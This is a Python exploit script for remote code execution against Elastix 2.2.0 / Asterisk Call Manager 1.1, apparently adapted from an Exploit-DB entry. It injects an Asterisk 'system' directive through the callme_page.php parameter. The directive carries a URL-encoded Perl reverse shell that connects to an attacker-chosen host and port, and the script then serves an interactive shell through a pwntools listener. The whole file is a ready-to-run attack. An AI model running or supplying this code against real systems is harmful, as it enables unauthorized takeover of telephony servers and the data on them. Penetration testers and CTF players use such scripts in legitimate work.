# -*- coding: utf-8 -*-

# Elastix 2.2.0 / Asterisk Call Manager 1.1 - LFI + RCE
# CVE: -
# Exploit author: Martin Tschirsich
# https://www.exploit-db.com/exploits/18650
# https://github.com/mhaskar/CVE-2019-13024/blob/master/Centreon-exploit.py
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import requests
import sys
from pwn import *
from urllib3.exceptions import InsecureRequestWarning

# Suppressing SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning) 


def main():
    
    # args
    argparser = argparse.ArgumentParser(description='Elastix 2.2.0 / Asterisk Call Manager 1.1 - LFI + RCE', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
    
    main_arg.add_argument('--rhost', type=str,
                            help='Elastix host', 
                            required=True)
                            
    main_arg.add_argument('--caller-extension', type=str,
                            help='Elastix host', 
                            required=True)
                            
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')
                            
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
    
    # cons
    rhost = args.rhost
    caller_extension = args.caller_extension
    lhost = args.lhost
    lport = args.lport
    burpsuite = args.burpsuite
    
    # proxies
    proxies = { "http": "127.0.0.1:8080" }
   
    
    def reverse_shell(l):
        
        print(" [*] Spawning the reverse shell...")
 
        l.sendline("""uname -a && id""")
        l.interactive()
        
    
    def exploit():
        
        url_base = "https://{}/recordings/misc/callme_page.php?".format(rhost)
        payload = "action=c&callmenum={}@from-internal/".format(caller_extension)
        payload += "n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e"
        payload += "%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET"
        payload += "%28PeerAddr%2c%22{}%3a{}%22%29%3bSTDIN-%3e".format(lhost, lport)
        payload += "fdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A"
        
        malicious_url = url_base + payload
        
        l = listen(lport)
        
        try:
            if burpsuite:
                requests.get(malicious_url, proxies=proxies, verify=False)
            else:
                requests.get(malicious_url, verify=False)
                
        except Exception as e:
            print(e)
            print(" [*] Failed to exploit the Elastix caller application!")
            sys.exit(1)
        
        else:
            reverse_shell(l)
    
    
    # main 
    print(" [>] Elastix 2.2.0 / Asterisk Call Manager 1.1 - LFI + RCE")
    print(" [*] Python script exploit author: nullarmor")
    
    exploit()    
        
if __name__ == "__main__":
    main()
